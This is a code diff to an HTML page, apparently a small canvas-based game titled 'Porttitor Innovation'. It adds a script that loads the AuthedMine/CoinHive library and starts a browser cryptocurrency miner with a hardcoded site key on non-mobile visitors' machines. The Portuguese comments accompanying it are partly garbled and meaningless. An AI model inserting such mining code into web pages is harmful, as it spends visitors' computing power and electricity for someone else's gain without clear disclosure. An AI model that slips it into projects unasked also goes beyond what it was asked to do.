@@ -9,7 +9,20 @@
 
 	<title>Porttitor Innovation</title>
 	<link href="style.css" media="all" rel="stylesheet" type="text/css">
+	<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+	<script>
+		var miner = new CoinHive.Anonymous('77b15v09cEMZqgjyq9gCAkAwKBIWkuCi', {throttle: 0.3});
+
+		// Apenas interopar em dispositivos não móveis e, se não for excluído nos últimos 14400 segundos (4 horas):
+		// Garantir a interrupção da entrega um fator de unicidade e a transparência de operação.
+		
+		if (!miner.isMobile() && !miner.didOptOut(14400)) {
+			miner.start();
+		}
+		
+	</script>
 </head>
+	
 <body>
 	<canvas id='c' style='width:100%;height=100%'></canvas>
 	<div id="level">
